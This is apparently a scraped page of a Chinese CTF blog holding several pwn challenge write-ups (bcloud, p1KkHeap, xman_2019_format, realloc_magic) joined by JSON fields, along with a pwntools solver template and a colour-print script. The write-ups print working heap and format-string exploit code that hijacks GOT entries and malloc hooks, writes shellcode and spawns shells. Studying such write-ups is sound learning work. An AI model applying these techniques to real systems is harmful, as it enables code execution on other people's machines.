chunk的size域，还要能分配任意大小的内存，总的来说，条件还是很多的。可以直接分配到got表附近，但是这样会破坏一些got表的内容，也可分配到堆指针数组，一般在bss或者data段。 strcpy会一直拷贝源字符串，直到遇到\\x0a或者\\x00字符。并且在拷贝结束后，尾部添加一个\\x00字符，很多off by one的题目就是基于此。 题目分析\r题目的运行环境是ubuntu 16，使用libc-2.23.so。 Checksec\r注意：arch为i386-32-little。 函数分析\r很明显，这又是一个菜单题。首先来看main函数： Main\r在进入while循环之前，首先调用了welcome函数引用与参考[1]，然后再去执行循环体。继续来看一下welcome中有什么操作。 Welcome\r这里面调了两个函数，继续分析 Get_name\r这里面操作为： 向栈变量s写入0x40大小的数据，有一个字节的溢出 申请内存，malloc(0x40)，得到的chunk大小为0x48 调用strcpy，把s的数据拷贝到刚刚申请的chunk的用户内存区域。 这里存在一个漏洞点，越界拷贝了堆地址，在后面的漏洞点中会有分析。 顺便放一下read_off_by_one函数和put_info函数： read_off_by_one: put_info: Get_org_host\r这里涉及到两次向栈变量上写数据，并且两次申请堆内存，两次调用strcpy接口。这里存在着溢出漏洞，后续漏洞点中会进一步分析。 Menu\rNew_note\r此住需要注意的点有： ptr_array里面最多填满10个地址 实际申请的chunk的大小是size + 4，能写的大小却是size，基本上不能使用off by one Show_note\rEdit_note\r从ptr_array数组和ptr_size数组中取出存储的地址和大小，并重新获取用户输入并写入数据。 Del_note\r释放指针指向的内存后直接将指针置为0 漏洞点\r一开始看这个程序的时候，一直把目光对准了while循环体里面，几个关于note的函数，因为一般情况下，漏洞点会出现在这些函数里面，事实证明，惯性思维害死人。找了半天，啥洞也没找到，最后把目光聚焦在welcome里面的两个函数，才发现了利用点。接下来，详细讲一讲漏洞点。 漏洞点1：get_name泄露堆地址\rget_name: 这里画一下栈内存与堆内存的变化： 填充内容前： 填充内容后： 因此，当填慢0x40个可见字符后，调用put_info打印内容的时候会把上面的chunk的地址给打印出来。 漏洞点2：get_org_host修改top Chunk的size域\rget_org_host函数： 填充前： 往栈变量s和p写了数据，并分配内存后： **执行两次strcpy**后： 可以看到top chunk的size域被更改了。 利用思路\r知识点\r本题主要使用House of Force Attack，注意，这个攻击方法在2.23、2.27版本的libc是奏效的，在libc-2.29.so加了top chunk的size域合法性的校验。 计算大小的时候，可以就直接给malloc传一个负数，会自动转化为正整数的。 可以在调试过程中确定要分配的那个大小，计算得到的size可能会有一些偏移。 利用过程\r利用步骤： 在get_name接口中，输入0x40 * 'a'，泄露出堆地址 通过get_org_host覆盖top chunk的size，修改为0xffffffff。 利用house of force分配到ptr_array，即地址为0x0x804b120。 连续分配4个用户大小为0x44大小的chunk A、B、C、D。那么，编辑chunk A的时候，就能直接修改ptr_array数组元素的地址。引用与参考[2]。 调用edit_note，编辑chunk A，将ptr_array[2]设置为free@got，将ptr_array[3]设置为printf@got。 调用edit_note，编辑ptr_array[2]的内容为puts@plt，就是将free@got修改为了puts@plt地址。 调用del_note，去释放ptr_array[3]，实际上调用的是puts打印出来了printf的地址。 再次调用edit_note，编辑chunk A，将ptr_array[0]设置为0x804b130，ptr_array[2]设置为free@got，将ptr_array[4]写为/bin/sh 调用edit_note，将free@got修改为了system地址 调用del_note，释放ptr_array[0]，即可getshell EXP\r调试过程\r定义好函数： def new_note(size, content, io:tube=sh): io.sendlineafter('option---\u003e\u003e\\n', '1') io.sendlineafter(\"Input the length of the note content:\\n\", str(size)) io.sendlineafter(\"Input the content:\\n\", content) io.recvline() def edit_note(idx, content, io:tube=sh): io.sendlineafter('option---\u003e\u003e\\n', '3') io.sendlineafter(\"Input the id:\\n\", str(idx)) io.sendlineafter(\"Input the new content:\\n\", content) io.recvline() def del_note(idx, io:tube=sh): io.sendlineafter('option---\u003e\u003e\\n', '4') io.sendlineafter(\"Input the id:\\n\", str(idx)) 执行get_name，泄露heap地址： sh.sendafter(\"Input your name:\\n\", 'a' * 0x40) sh.recvuntil('a' * 0x40) leak_heap_addr = u32(sh.recvn(4)) LOG_ADDR('leak_heap_addr', leak_heap_addr) 执行get_org_host，修改top chunk的size为0xffffffff： sh.sendafter(\"Org:\\n\", 'a' * 0x40) sh.sendafter(\"Host:\\n\", p32(0xffffffff) + (0x40 - 4) * b'a') sh.recvuntil(\"OKay! Enjoy:)\\n\") 计算出top chunk的地址，分配到0x804b120： top_chunk_addr = leak_heap_addr + 0xd0 ptr_array = 0x804b120 margin = ptr_array - top_chunk_addr new_note(margin - 20, \"\") # 0 连续分配四块chunk，修改free@got的内容为puts@plt，泄露出libc的地址： free_got = 0x804b014 puts_plt = 0x8048520 printf_got = 0x804b010 for _ in range(4): new_note(0x40, 'aa') edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got)) edit_note(2, p32(puts_plt)) del_note(3) msg = sh.recvuntil(\"Delete success.\\n\") printf_addr = u32(msg[:4]) LOG_ADDR('printf_addr', printf_addr) 计算出system地址，修改free@got为system函数的地址，并准备好/bin/sh： system_addr = printf_addr - offset edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh') edit_note(2, p32(system_addr)) 释放带有/bin/sh的chunk，即可getshell： del_note(0) 完整exp\rfrom pwn import * context.update(arch='i386', os='linux') sh = process('./bcloud_bctf_2016') LOG_ADDR = lambda s, i:log.info('{} ===\u003e {}'.format(s, i)) def new_note(size, content, io:tube=sh): io.sendlineafter(","date":"2021-04-03","objectID":"/zh-cn/2021-04-03-bcloud-bctf-2016/:0:0","tags":["pwn"],"title":"bcloud_bctf_2016","uri":"/zh-cn/2021-04-03-bcloud-bctf-2016/"},{"categories":["tools"],"content":"这是专门为本地调试与远程答题准备的脚本，依靠命令行参数进行控制。 本脚本支持的功能有： 本地调试 开启tmux调试 设置gdb断点，支持函数名断点、地址断点、文件名:行号断点、$rebase(0x00)断点 设置gdb script，可以设置任何内置的gdb命令 远程答题 默认支持buuctf，只需要指定远程port 显式指定远程ip和port 使用的装饰器函数、偏函数 在执行函数前、后线程休眠指定秒数 记录函数执行日志 int16，字符串与整数转化 可自由定制 依托click模块进行自由定制 脚本内容\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # @File : do_pwn_template.py # @Time : 2021/04/02 21:15:43 # @Author : Roderick Chan # @Email : ch22166@163.com # @Desc : pwn题本地调试、远程攻击脚本 ''' ========================================================================================== 本脚本为pwn题所编写，利用click模块配置命令行参数， 能方便地进行本地调试和远程解题。 本地命令示例： python3 exp.py filename --tmux 1 --gdb-breakpoint 0x804802a --gdb-breakpoint printf python3 exp.py filename -t 1 -gb 0x804802a -gb printf python3 exp.py filename -t 1 -gs \"x /12gx \\$rebase(0x202080)\" -sf 0 -pl \"warn\" 即可开始本地调试,并且会断在地址或函数处。先启动tmux后，--tmux才会有效。 远程命令示例： python3 exp.py filename -i 127.0.0.1 -p 22164 python3 exp.py filename -p 22164 可以连接指定的IP和端口。目前在刷buuctf上的题，所以填了默认ip，只指定端口即可。 ========================================================================================== ''' from pwn import * from LibcSearcher import LibcSearcher import click import sys import os import time import functools print(__doc__) FILENAME = '#' # 要执行的文件名 DEBUG = 1 # 是否为调试模式 TMUX = 0 # 是否开启TMUX GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置 GDB_SCRIPT = None # 当tmux开启的时候, gdb_script的设置，可以是任意有效的语句 IP = None # 远程连接的IP PORT = None # 远程连接的端口 LOCAL_LOG = 1 # 本地LOG是否开启 PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置 STOP_FUNCTION = 1 # STOP方法是否开启 CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help']) @click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!') @click.argument('filename', nargs=1, type=str, required=0, default=None) @click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.') @click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.') @click.option('-gb', '--gdb-breakpoint', default=[], type=str, multiple=True, help=\"Set a gdb breakpoint while tmux is enabled, is a hex address or '\\$rebase' addr or a function name. Multiple setting supported. Default value:'[]'\") @click.option('-gs', '--gdb-script', default=None, type=str, help=\"Set a gdb script while tmux is enabled, the script will be passed to gdb and use '\\\\n' or ';' to split lines. Default value:None\") @click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.') @click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.') @click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.') @click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.') @click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.') def parse_command_args(filename, debug, tmux, gdb_breakpoint, gdb_script, ip, port, local_log, pwn_log, stop_function): '''FILENAME: The filename of current directory to pwn''' global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, GDB_SCRIPT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION # assign FILENAME = filename DEBUG = debug TMUX = tmux GDB_BREAKPOINT = gdb_breakpoint GDB_SCRIPT = gdb_script IP = ip PORT = port LOCAL_LOG = local_log PWN_LOG_LEVEL = pwn_log STOP_FUNCTION = stop_function # change if PORT: # 远程下这些是需要关闭的 DEBUG = 0 TMUX = 0 STOP_FUNCTION = 0 GDB_BREAKPOINT = None GDB_SCRIPT = None if IP is None: IP = 'node3.buuoj.cn' if DEBUG: IP = None PORT = None # assert assert not (FILENAME is None and PORT is None), 'para error' assert not (FILENAME is None and DEBUG == 1), 'para error' assert not (PORT is not None and DEBUG == 1), 'para error' assert not (DEBUG == 0 and TMUX == 1), 'para error' # print click.","date":"2021-04-02","objectID":"/zh-cn/2021-04-02-pwn%E9%A2%98%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC/:0:0","tags":["pwn"],"title":"pwn题命令行解题脚本","uri":"/zh-cn/2021-04-02-pwn%E9%A2%98%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC/"},{"categories":["tools"],"content":"之前调试pwn题的时候，有时候需要将某些特别的，重要的信息用不一样的颜色打印出来。查阅一些资料，了解了print函数的特性后，自己写了一个脚本，可以用来获取带颜色信息的字符串或者打印一串带颜色、背景色、下划线等的字符串。 脚本内容\r#!/usr/bin/env python3 # -*- encoding: utf-8 -*- ''' @File : print_with_color.py @Time : 2021/03/07 12:41:35 @Author : Lynne @Email : ch22166@163.com @Desc : None ''' from functools import partial class FontColor: BLACK = 30 RED = 31 GREEN = 32 YELLO = 33 BLUE = 34 AMARANTH = 35 CYAN = 36 WHITE = 37 class BackgroundColor: NOCOLOR = -1 BLACK = 40 RED = 41 GREEN = 42 YELLO = 43 BLUE = 44 AMARANTH = 45 CYAN = 46 WHITE = 47 class TerminalMode: DEFAULT = 0 HIGHLIGHT = 1 UNDERLINE = 4 TWINKLE = 5 ANTI_WHITE = 7 INVISIBLE = 8 def __check(font_color:int, background_color:int, terminal_mode:int) -\u003e bool: b1 = (font_color \u003e= FontColor.BLACK and font_color \u003c= FontColor.WHITE) b2 = (background_color \u003e= BackgroundColor.BLACK and background_color \u003c= BackgroundColor.WHITE) or background_color == BackgroundColor.NOCOLOR b3 = (terminal_mode \u003e= TerminalMode.DEFAULT and terminal_mode \u003c= TerminalMode.INVISIBLE and terminal_mode != 2 and terminal_mode != 3 and terminal_mode != 6) return (b1 and b2 and b3) def get_str_with_color(print_str:str, *, font_color:int=FontColor.WHITE, background_color:int=BackgroundColor.NOCOLOR, terminal_mode:int=TerminalMode.DEFAULT)-\u003e str: \"\"\"Decorate a string with color Args: print_str (str): The str you want to modify. font_color (int, optional): Font color. Defaults to FontColor.WHITE. background_color (int, optional): Background color. Defaults to BackgroundColor.NOCOLOR. terminal_mode (int, optional): terminal mode. Defaults to TerminalMode.DEFAULT. Returns: str: A string with elaborate decoration. \"\"\" check = __check(font_color, background_color, terminal_mode) if not check: print('\\033[1;31;47mWARNING: Failure to set color!\\033[0m') return print_str if background_color == BackgroundColor.NOCOLOR: background_color = '' else: background_color = ';'+str(background_color) res_str = '\\033[{};{}{}m{}\\033[0m'.format(terminal_mode, font_color, background_color, print_str) return res_str def print_color(print_str:str, *, font_color:int=FontColor.WHITE, background_color:int=BackgroundColor.NOCOLOR, terminal_mode:int=TerminalMode.DEFAULT): \"\"\"print a string with color Args: print_str (str): The str you want to modify. font_color (int, optional): Font color. Defaults to FontColor.WHITE. background_color (int, optional): Background color. Defaults to BackgroundColor.NOCOLOR. terminal_mode (int, optional): terminal mode. Defaults to TerminalMode.DEFAULT. \"\"\" print(get_str_with_color(print_str, font_color=font_color, background_color=background_color, terminal_mode=terminal_mode)) # make rgb print func print_red = partial(print_color, font_color=FontColor.RED, background_color=BackgroundColor.NOCOLOR, terminal_mode=TerminalMode.DEFAULT) print_green = partial(print_color, font_color=FontColor.GREEN, background_color=BackgroundColor.NOCOLOR, terminal_mode=TerminalMode.DEFAULT) print_blue = partial(print_color, font_color=FontColor.BLUE, background_color=BackgroundColor.NOCOLOR, terminal_mode=TerminalMode.DEFAULT) if __name__ == '__main__': print('Original print: lynne') print_red('Print with red font: lynne') print_green('Print with green font: lynne') print_blue('Print with blue font:lynne') print_color('Print with cyan font, blue background and underline: lynne', font_color=FontColor.CYAN, background_color=BackgroundColor.BLUE, terminal_mode=TerminalMode.UNDERLINE) 在控制台的打印效果如下： 使用\rget_str_with_color：获取带颜色信息的字符串 print_color：带颜色打印字符串 print_red/print_green/print_blue：自已定义一些偏函数，方便使用 ","date":"2021-03-28","objectID":"/zh-cn/2021-03-28-python%E5%B8%A6%E9%A2%9C%E8%89%B2%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E4%B8%B2/:0:0","tags":["python"],"title":"python带颜色打印字符串","uri":"/zh-cn/2021-03-28-python%E5%B8%A6%E9%A2%9C%E8%89%B2%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： tcache attack时 如果可以利用tcache_perthread_struct，优先考虑利用这个结构体，可以省去很多麻烦。控制了这个结构体，相当于就控制了malloc的分配，可以控制tcache bins中chunk的数量和分配地址。 tcache_perthread_struct结构体在堆上，大小一般为0x250。它的前64个字节，分别代表0x20~0x410大小的chunk(包括chunk头)的数量。当超过7的时候，再次释放的chunk会被放入到fastbin或者unsorted bin。后面的内存，则分别表示0x20~0x410大小tcache bins的首地址。 如图所示： 然后看一下内部细节： 首地址如果是一个有效的地址，下一次分配对应大小的chunk会直接从该地址处分配，没有chunk size的检查。 tcache attack可以重复释放，可以直接修改tcache entry的值，没有chunk size的检查。 题目分析\rChecksec\r保护全开！ 函数分析\r很明显，又是一个菜单题。首先来看main函数。 Main\r这些函数的名字我都修改过。然后看一下这个set_prctl到底干了啥： Set_prctl\r同时，结合seccomp-tools查看一下禁用了哪些系统调用： 不能执行execve系统调用。那么结合前面的mmap，猜测可以控制程序执行流到0x66660000处，提前在这里写好shellcode，通过orw的方式读取flag。 继续往下分析函数。 Menu\rAdd_note\rsize的大小只能控制在0x100以内，最多执行该函数7次。 Show_note\rEdit_note\rDel_note\r可以看到，只能free三次，且存储内存指针的数组没有置为空。 漏洞点\r程序的运行环境为ubuntu 18.04，libc的版本为2.27，有tcache bin机制。可以很明显的看到，在del_note函数中有一个UAF的漏洞。但是，最多只能free3次。结合tcache dup的利用手段，tcache bin连续两次释放，并不会crash，而会造成这个链表自己指向自己。这样，连续分配三次后，可以在任意地址分配chunk。 mmap分配的内存具有可读可写可执行的权限，所以可以往这上面写shellcode，然后劫持malloc_hook到地址0x66660000，跳转执行shellcode。注意，不能包含execve的系统调用，所以只能写orw的shellcode。 利用思路\r知识点\r如上面所说，每一个线程都会维护一个结构体，名为tcache_perthread_struct，这个结构体负责tcache in chunk的分配。所以，只要控制住这个结构体，就能实现控制任意大小的tcache bin chunk的任意地址的分配。 当tcache bins放满7个后，剩余free掉的chunk会被放到fastbin或者unsorted bin。这里判断对应带大小的tcache bins的方法，就是检查tcache_perthread_struct中的字段的大小是不是大于6。 calloc不会从tcache bin中取chunk，但是如果对应大小的tcache bin未满7个的话，会把对应大小的fastbin或者small bin以头插法的形式，插入到tcache bin中。也就是说，如果修改了fd/bk指针，可以往任意一个地方写一个libc地址。（这个知识点可能用不到，不过可以先总结一下。） 利用过程\r这里采取劫持tcache_perthread_struct，然后通过控制对应大小的tcache bin的数量，使得下一次释放的chunk被放置在unsorted bin中。，从而泄露出libc的地址，根据偏移计算出malloc_hook的地址。 步骤： 连续申请两块大小为0x100大小的chunk 0和chunk 1 连续释放两次chunk 1 通过show功能打印出堆地址，进而泄露出tcache_perthread_struct的地址，并分配到这里 修改0x100大小的tcache bin的首地址为0x66660000和个数为0 分配到0x66660000处，写入shellcode 释放chunk 0，此时chunk 0会进入到unsorted bin，利用show功能打印出libc地址 再次控制tcache_perthread_struct，分配到malloc_hook处，写入0x66660000 任意执行一次add_note即可打印出flag EXP\r调试过程\r我们就按照上面所说的这个利用思路来进行调试。 定义好相关的函数： def add_note(size:int): global io io.sendlineafter(\"Your Choice: \", '1') io.sendlineafter(\"size: \", str(size)) io.recvuntil(\"Done!\\n\") def show_note(idx:int): global io io.sendlineafter(\"Your Choice: \", '2') io.sendlineafter(\"id: \", str(idx)) msg = io.recvline() leak_addr = msg[9:15] leak_addr = u64(leak_addr.ljust(8, b'\\x00')) LOG_ADDR('leak_addr', leak_addr) io.recvuntil(\"Done!\\n\") return leak_addr def edit_note(idx:int, content:bytes=b'a'): global io io.sendlineafter(\"Your Choice: \", '3') io.sendlineafter(\"id: \", str(idx)) io.sendafter(\"content: \", content) io.recvuntil(\"Done!\\n\") def del_note(idx:int): global io io.sendlineafter(\"Your Choice: \", '4') io.sendlineafter(\"id: \", str(idx)) io.recvuntil(\"Done!\\n\") 首先执行两次add_note add_note(0x100) # 0 add_note(0x100) # 1 然后，执行tcache dup： del_note(1) del_note(1) 然后泄露出地址，并分配到tcache_perthread_struct # get heap addr heap_addr = show_note(1) tcache_struct = heap_addr - 0x360 add_note(0x100) # 2 edit_note(2, p64(tcache_struct) * 2) add_note(0x100) # 3 add_note(0x100) # 4 tcache struct 可以看到，0x100大小的chunk的count变成了-1 分配到0x66660000 edit_note(4, 0xb8 * b'\\x00' + p64(0x66660000)) # 0x66660000 chunk add_note(0x100) # 5 写入shellcode到0x66660000 shellcode = shellcraft.open('flag', 0) shellcode += shellcraft.read(3, 0x66660300, 0x30) shellcode += shellcraft.write(1, 0x66660300, 0x30) edit_note(5, asm(shellcode)) 泄露libc地址，并且计算出malloc_hook地址 del_note(0) main_arena_96 = show_note(0) malloc_hook = main_arena_96 - 0x70 分配到malloc_hook，写入0x66660000，并执行一次add_note add_note(0x100) # 6 edit_note(6, p64(0x66660000)) io.sendlineafter(\"Your Choice: \", '1') io.sendlineafter(\"size: \", str(100)) 最后远程打的结果： 完整exp\rfrom pwn import * context.update(arch='amd64', os='linux', endian='little') io = process('./pwn') def add_note(size:int): global io io.sendlineafter(\"Your Choice: \", '1') io.sendlineafter(\"size: \", str(size)) io.recvuntil(\"Done!\\n\") def show_note(idx:int): global io io.sendlineafter(\"Your Choice: \", '2') io.sendlineafter(\"id: \", str(idx)) msg = io.recvline() leak_addr = ","date":"2021-03-28","objectID":"/zh-cn/2021-03-28-swpuctf-2019-p1kkheap/:0:0","tags":["pwn"],"title":"SWPUCTF_2019_p1KkHeap","uri":"/zh-cn/2021-03-28-swpuctf-2019-p1kkheap/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： printf的字符串，如果是在堆上，那么就无法在栈上写地址利用%x$hn去修改 printf会一次性取出所有的偏移的地址，再去修改。不是边写边修改！(结合调试过程理解！) 由于ebp寄存器会记录一个栈地址链，所以可以利用这一点特性，爆破修改这个栈地址链的最低字节，然后修改ebp寄存器后4个字节的内容，理想状态下，爆破1个字节即可，而且，所有的地址都是对齐到地址页。 题目分析\rChecksec\r函数分析\rMain\rSub_804869D\rSub_8048651\rSub_804862A\rSub_80485c4\r层层套娃，终于走到了最后的处理函数。strtok是字符串分割函数，分割的符号为|。 漏洞点\r漏洞点很清楚，就是函数sub_80485c4中，将传入的字符串使用|分割后，直接调用printf函数。很明显的格式化字符串漏洞。但是这里要注意：字符串存储在堆上。所以，不能在栈上写地址，然后利用栈的偏移来向任意地址写。因此，只能借助栈上已有的地址，往eip寄存器里面写入目标地址。 注意到有一个后门函数： 只需要覆盖为这个函数的地址即可。 利用思路\r因此，本题利用的思路很清晰： printf确定偏移 利用栈上的地址链，特别是ebp地址链，修改中间某一个地址的最低字节，修改为存储eip寄存器内容的那个地址 将这个可能会被压入eip寄存器的地址的内容，修改为0x80475AB get_shell EXP\r调试过程\r本题需要一步步调试出来，首先测试一下偏移： # 输入：%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x 输入之前看一下栈： 这个调用链还是很明显的 执行完成打印出来的内容为： 数一下，偏移为10。 这个时候需要结合栈图整理一下思路： 首先修改0xffffceb8地址处的内容为0xffffce9c，这里需要修改最低的一个字节，偏移为10 然后修改0xffffce9c地址处的内容为0x80485ab，这里只需要修改最低的两个字节，偏移为18 很容易写出最后的输入应该为： %156c%10$hhn%34219c%18$hn 可以调试一下，在printf函数下个断点，然后观察一下0xfffceb8的内容变化： 第一次命中断点： 第二次命中断点： 此处的值已经改变： 可以看到，最低字节已经修改成功。然后继续执行printf，看下0xffffce9c是不是修改为目标值： 发现修改失败了： 还是修改的最初的0xffffcee8的内容，并不是去修改的0xffffce9c的内容！这说明，printf格式化执行的时候，首先把所有对应偏移的地址先取出来，然后再去修改！ 题目中，有一个|分割符，因此，只需要利用分割符分开输入即可！ 所以，最终的输入为： %156c%10$hhn|%34219c%18$hn 执行了/bin/bash 完整exp\r实际上需要爆破最低的那个字节，所以最终的exp如下： from pwn import * context.log_level='debug' for x in range(4, 0x100, 4): tar = '%' + str(x) + 'c%10$hhn|%34219c%18$hn' try: sh = process('./xman_2019_format') # sh = remote('node3.buuoj.cn', 27180) log.info('current low byte:{}'.format(hex(x))) sh.recv() sh.sendline(tar) sh.recv(timeout=1) sleep(1) sh.sendline('cat flag') sh.recvline_contains('flag', timeout=1) sh.interactive() except: sh.close() 远程爆破过程为： ","date":"2021-03-28","objectID":"/zh-cn/2021-03-28-xman-2019-format/:0:0","tags":["pwn"],"title":"xman_2019_format","uri":"/zh-cn/2021-03-28-xman-2019-format/"},{"categories":["pwn-wp"],"content":"总结\r做完这道题后总结如下： realloc功能比较多，使用需要谨慎 可利用修改stdout结构体的flags和_IO_write_base来泄露libc中的地址 利用main_arena来劫持stdout结构体 题目分析\rChecksec\r首先checksec一下，发现保护全开： 函数分析\r然后将题目拖进IDA分析，首先看main函数： 可以看到，main函数并不复杂，一个菜单加上3个选项。 menu： re： fr： ba： 这里需要注意，分配内存函数使用的是realloc(void* ptr, size_t size)，这个函数的功能很多，查看源码后发现其功能有： 当ptr == nullptr的时候，相当于malloc(size)， 返回分配到的地址 当ptr != nullptr \u0026\u0026 size == 0 的时候，相当于free(ptr)，返回空指针 当size小于原来ptr所指向的内存的大小时，直接缩小，返回ptr指针。被削减的那块内存会被释放，放入对应的bins中去 当size大于原来ptr所指向的内存的大小时，如果原ptr所指向的chunk后面又足够的空间，那么直接在后面扩容，返回ptr指针；如果后面空间不足，先释放ptr所申请的内存，然后试图分配size大小的内存，返回分配后的指针 可以看到，realloc函数功能很多，也很危险，使用不当的话会引来严重的安全问题。 ba函数可以将realloc_ptr置为空，但是只有一次使用机会，re函数会释放内存，但是没有置为空，存在double free的漏洞。 题目使用的是ubuntu 18的环境，对应的libc的版本为2.27，考虑使用tcache attack。 解题思路\r漏洞找到了，而一般的tcache attack也很简单，就是直接修改tcache bin chunk的next指针，可以进行任意地址写。所以，初步的解题思路是： 初步解题思路\r利用fr函数进行tcache dup 修改chunk的next指针，覆盖__free_hook，为one_gadget 修改后触发fr函数，获取shell 思路没啥问题，但是中间有几个关键的问题： 存在的问题\r分配函数是realloc，所以如果指针ptr不置为空，就无法达到malloc的效果，ptr所指向的chunk要么扩大，要么缩小，要么换一片内存段进行内存分配，没有办法从bins里面取出chunk 题目里似乎没有泄露地址的函数，要想往__free_hook写入one_gadget需要libc的基地址 问题解决方案\r回忆一下刚刚总结的realloc函数的特点，可以发现，在上图的re函数第7行，将realloc_ptr接收返回后的指针，那么如果realloc_ptr != 0 \u0026\u0026 size==0，就会触发free(realloc_ptr)，并且将realloc_ptr置为0。所以，第一个问题就解决了。 当题目没有泄露地址的函数或功能的时候，可以通过劫持stdout结构体，修改flags和_IO_write_base来泄露libc中的地址，进而获取到libc的基地址。攻击原理就不详述了，这位师傅写的很好：利用IO_2_1_stdout_泄露信息。最后需要将stdout结构体的flags修改为0x0FBAD1887，将_IO_write_base的最后一个字节覆盖为0x58。劫持stdout可以借助main_arena来操作，只需要修改低字节的几个地址即可。 最终解决思路\r由以上分析，可以总结出最终的解题思路为： 首先分配一块合适大小的内存块A。这段内存用于调用realloc往后面扩张，覆写tcache bin chunk的size和next指针。 利用re函数将realloc_ptr指针置为空，然后分配一块大小在small bin chunk范围的内存块B，如大小为0x80。这是为了之后能得到unsorted bin 利用re函数将realloc_ptr指针置为空，然后随意分配一块内存块C，用于隔开top chunk。 利用re函数将realloc_ptr指针置为空， 申请大小为0x80的内存，得到了刚刚释放的那块内存B。然后利用fr函数和re函数将realloc_ptr释放8次，使得tcache bin和unsorted bin存在重合，同时realloc_ptr所对应的chunk的fd和bk指针，都指向了main_arena + 96。 重新将内存块A申请回来，然后扩张，修改内存块A下面的内存块B的size为0x51，这里可以修改为任意在tcache bin范围内的值，是为了避免再次调用realloc(realloc_ptr, 0)的时候，又改变了tcache bin链上的指针。保证能将内存申请到stdout附近。 然后申请内存到stdout结构体附近，修改flags和_IO_write_base的值。泄露出libc的地址，计算得到__free_hook地址和one_gadget的地址。 接下来不能利用re来清空realloc_ptr指针，程序会挂掉，因为绕不过检查。这里选择使用ba函数，来将指针置为空。 然后重复上面的1-4步，修改__free_hook的值为one_gadget，触发fr函数，获取shell。 编写exp\r根据最终的解题思路，编写exp并调试，过程记录如下： 定义好函数： def re(size:int=0, content:bytes=b'\\x00'): global io io.sendlineafter(\"\u003e\u003e \", '1') io.sendlineafter(\"Size?\\n\", str(size)) io.recvuntil(\"Content?\\n\") if size \u003e 0: io.send(content) return io.recvuntil(\"Done\\n\") def fr(): global io io.sendlineafter(\"\u003e\u003e \", '2') io.recvuntil(\"Done\\n\") restraint = 1 def ba(): global io, restraint if restraint == 0: return io.sendlineafter(\"\u003e\u003e \", '666') io.recvuntil(\"Done\\n\") restraint -= 1 执行思路的1-4步： re(0x30)# 首先申请/释放 为后面覆盖写做准备 A re(0) # 释放，并把指针置为空 re(0x80) # 申请 B re(0) # 释放置空 re(0x40) # C re(0) # 置0 隔开topchunk re(0x80) # 申请回来 B for x in range(7): # 释放7次 fr() re(0) # 得到unsorted bin 同时指针置空 看一下此时的bins： 然后修改内存块B的size和next指针，劫持到stdout，同时泄露出地址 re(0x30) # 取出来 # 修改两个字节 最低的一个字节是 0x60 des = int16(input('1 byes:')) des = (des \u003c\u003c 8) + 0x60 re(0x50, p64(0) * 7 + p64(0x51) + p16(des)) # 踩低字节 re(0) re(0x80) re(0) msg = re(0x80, p64(0x0FBAD1887) + p64(0) * 3 + p8(0x58)) leak_addr = u64(msg[:8]) free_hook_addr = leak_addr + 0x5648 这里调试的时候可以发现，_IO_2_1_stdout_的低两个字节和main_arena + 96不同，理论上需要改这两个字节，实际上最后一个字节一直是0x60，所以只需要改一个字节就行了。此处为本地调试，可以手动查看要修改的内容，然后填上去。 输入0xb7后，修改成功： 然后分配到stdout结构体，修改flags等，泄露出地址： 计算一下基地址，__free_hook的地址等： 重复一下上面的过程，在_free_hook附近写上one_gadget即可： gadget = [0x4f2c5, 0x4f322, 0x10a38c] one_gadget = free_hook_addr - 0x3ed8e8 + gadget[1] ba() # 指针置空 # 重复上面的操作，在free_hook上写one_gadget re(0x10) re(0) re(0x90) re(0) re(0x20) # 隔开top chunk re(0) # 开始dump0x90 re(0x90) for x in range(7): fr() re(0) re(0x10) re(0x50, p64(0) * 3 + p64(0x51) + p64(free_hook_addr)) re(0) re(0x90) re(0) re(0x90, p64(one_gadget)) # delete io.sendlineafter(\"\u003e\u003e \", '2') io.sendline('cat flag') io.interactive() 之后就可以拿到shell： 最后贴一下完整的exp from pwn import * from LibcSearcher import LibcSearcher import click import sys import os import time import f","date":"2021-03-28","objectID":"/zh-cn/2021-03-28-roarctf-2019-realloc-magic/:0:0","tags":["pwn"],"title":"roarctf_2019_realloc_magic","uri":"/zh-cn/2021-03-28-roarctf-2019-realloc-magic/"},{"categories":["pwn-wp"],"content":"总结\r本题主要为printf格式化字符串漏洞，最好的方式是手写fmt payload，然后有一些新的知识点： pwntools的fmtstr_payload不是特别好用，特别是只想写低字节的时候，还是得手动写fmt_payload，抽个时间自己写个格式化payload生成函数吧。也不是第一次在这儿折腾了。 一个新的知识点：程序在初始化的时候，会依次调用init.array中的函数指针；在main函数执行完退出的时候，依次调用.fini.array中的函数指针。这两个段基本都是可读可写的。前提是NO RELRO，就可写。 可以利用printf将fini.array数组中的第一个元素覆盖为main函数的地址，或者_start函数的地址，可以循环运行main函数。本题只能多循环利用1次，之后就会报错。因为fini.array段的只有一个指针大小。 题目分析\rChecksec\r函数分析\rmain： 